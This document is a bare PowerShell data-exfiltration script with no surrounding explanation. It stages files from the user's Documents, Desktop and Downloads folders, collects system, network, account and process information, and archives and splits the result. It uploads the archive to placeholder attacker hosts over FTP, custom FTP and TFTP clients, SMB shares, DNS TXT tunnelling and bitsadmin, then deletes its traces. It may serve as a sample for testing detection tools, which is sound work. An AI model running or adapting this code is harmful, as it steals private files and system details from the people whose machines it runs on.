$stagingDir = "$env:TEMP\exfil_$((Get-Random -Max 9999))"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null

Get-ChildItem "$env:USERPROFILE\Documents" -Recurse -Include "*.docx","*.xlsx","*.pdf","*.csv","*.pptx" -ErrorAction SilentlyContinue | Select-Object -First 5 | ForEach-Object {
    Copy-Item $_.FullName $stagingDir -Force -ErrorAction SilentlyContinue
}
Get-ChildItem "$env:USERPROFILE\Desktop" -Recurse -Include "*.docx","*.xlsx","*.pdf","*.txt","*.csv" -ErrorAction SilentlyContinue | Select-Object -First 5 | ForEach-Object {
    Copy-Item $_.FullName $stagingDir -Force -ErrorAction SilentlyContinue
}
Get-ChildItem "$env:USERPROFILE\Downloads" -Recurse -Include "*.docx","*.xlsx","*.pdf" -ErrorAction SilentlyContinue | Select-Object -First 3 | ForEach-Object {
    Copy-Item $_.FullName $stagingDir -Force -ErrorAction SilentlyContinue
}

& systeminfo.exe 2>&1 | Out-File (Join-Path $stagingDir "sysinfo.txt") -Force
& ipconfig.exe /all 2>&1 | Out-File (Join-Path $stagingDir "network.txt") -Force
& net.exe user 2>&1 | Out-File (Join-Path $stagingDir "users.txt") -Force
& tasklist.exe /v 2>&1 | Out-File (Join-Path $stagingDir "processes.txt") -Force
"EXFIL_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$env:COMPUTERNAME" | Out-File (Join-Path $stagingDir "manifest.txt") -Force

$archive = "$env:TEMP\backup_$(Get-Date -Format 'yyyyMMdd').zip"
try { Compress-Archive -Path "$stagingDir\*" -DestinationPath $archive -Force } catch {}

$split1 = "$env:TEMP\chunk_aa.enc"
$split2 = "$env:TEMP\chunk_ab.enc"
if (Test-Path $archive) {
    $bytes = [IO.File]::ReadAllBytes($archive)
    $mid = [math]::Floor($bytes.Length / 2)
    try {
        [IO.File]::WriteAllBytes($split1, $bytes[0..($mid-1)])
        [IO.File]::WriteAllBytes($split2, $bytes[$mid..($bytes.Length-1)])
    } catch {}
}

$ftpScript = @"
open ftp.evil-exfil-server.com
anonymous
anonymous@
binary
cd /incoming
put $archive
put $split1
put $split2
quit
"@
$ftpCmd = "$env:TEMP\ftp_commands.txt"
$ftpScript | Out-File $ftpCmd -Encoding ASCII -Force
& ftp.exe -s:$ftpCmd 2>&1 | Out-Null

$ftpScript2 = @"
open 198.51.100.1
anonymous
pass@
binary
put $archive
quit
"@
$ftpCmd2 = "$env:TEMP\ftp_commands2.txt"
$ftpScript2 | Out-File $ftpCmd2 -Encoding ASCII -Force
& ftp.exe -s:$ftpCmd2 2>&1 | Out-Null

if (-not ('FTPExfil' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Net.Sockets;
    using System.IO;
    public class FTPExfil {
        public static string Upload(string server, int port, string file) {
            try {
                var tcp = new TcpClient();
                tcp.Connect(server, port);
                var stream = tcp.GetStream();
                var w = new StreamWriter(stream); var r = new StreamReader(stream);
                r.ReadLine();
                w.WriteLine("USER anonymous"); w.Flush(); r.ReadLine();
                w.WriteLine("PASS exfil@test.com"); w.Flush(); r.ReadLine();
                w.WriteLine("TYPE I"); w.Flush(); r.ReadLine();
                w.WriteLine("PASV"); w.Flush(); r.ReadLine();
                w.WriteLine("STOR " + Path.GetFileName(file)); w.Flush(); r.ReadLine();
                w.WriteLine("QUIT"); w.Flush();
                tcp.Close();
                return "done";
            } catch (Exception ex) { return ex.Message; }
        }
    }
'@
}

foreach ($srv in @("ftp.evil-exfil-server.com", "198.51.100.1", "203.0.113.50", "192.0.2.100")) {
    [FTPExfil]::Upload($srv, 21, $archive) | Out-Null
}

try {
    $wc = New-Object System.Net.WebClient
    $wc.Credentials = New-Object System.Net.NetworkCredential("anonymous", "exfil@test.com")
    $wc.UploadFile("ftp://ftp.evil-exfil-server.com/incoming/$(Split-Path $archive -Leaf)", $archive)
} catch {}
try {
    $wc2 = New-Object System.Net.WebClient
    $wc2.Credentials = New-Object System.Net.NetworkCredential("anonymous", "a@b.com")
    $wc2.UploadFile("ftp://198.51.100.1/$(Split-Path $archive -Leaf)", $archive)
} catch {}

if (-not ('TFTPExfil' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Net.Sockets;
    public class TFTPExfil {
        public static string Send(string server, string file) {
            try {
                var udp = new UdpClient();
                byte[] wrq = new byte[] { 0x00, 0x02 };
                byte[] fname = System.Text.Encoding.ASCII.GetBytes(System.IO.Path.GetFileName(file));
                byte[] mode = System.Text.Encoding.ASCII.GetBytes("octet");
                byte[] packet = new byte[wrq.Length + fname.Length + 1 + mode.Length + 1];
                Buffer.BlockCopy(wrq, 0, packet, 0, 2);
                Buffer.BlockCopy(fname, 0, packet, 2, fname.Length);
                Buffer.BlockCopy(mode, 0, packet, 3 + fname.Length, mode.Length);
                udp.Send(packet, packet.Length, server, 69);
                udp.Close();
                return "sent";
            } catch (Exception ex) { return ex.Message; }
        }
    }
'@
}

foreach ($srv in @("198.51.100.1", "203.0.113.50", "ftp.evil-exfil-server.com")) {
    [TFTPExfil]::Send($srv, $archive) | Out-Null
}

foreach ($smb in @("\\198.51.100.1\share", "\\203.0.113.50\data", "\\192.0.2.100\drops")) {
    try { Copy-Item $archive "$smb\$(Split-Path $archive -Leaf)" -Force -ErrorAction Stop } catch {}
}

try {
    $encoded = [Convert]::ToBase64String([IO.File]::ReadAllBytes($archive))
    $dnsChunks = $encoded -split '(.{60})' | Where-Object { $_ }
    foreach ($chunk in ($dnsChunks | Select-Object -First 5)) {
        Resolve-DnsName "$chunk.exfil.evil-exfil-server.com" -Type TXT -ErrorAction SilentlyContinue | Out-Null
    }
} catch {}

& certutil.exe -encode $archive "$env:TEMP\encoded.b64" 2>&1 | Out-Null
Remove-Item "$env:TEMP\encoded.b64" -Force -ErrorAction SilentlyContinue

& bitsadmin.exe /transfer exfiljob /upload "http://198.51.100.1/upload" $archive 2>&1 | Out-Null

Remove-Item $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $archive -Force -ErrorAction SilentlyContinue
Remove-Item $split1,$split2 -Force -ErrorAction SilentlyContinue
Remove-Item $ftpCmd,$ftpCmd2 -Force -ErrorAction SilentlyContinue
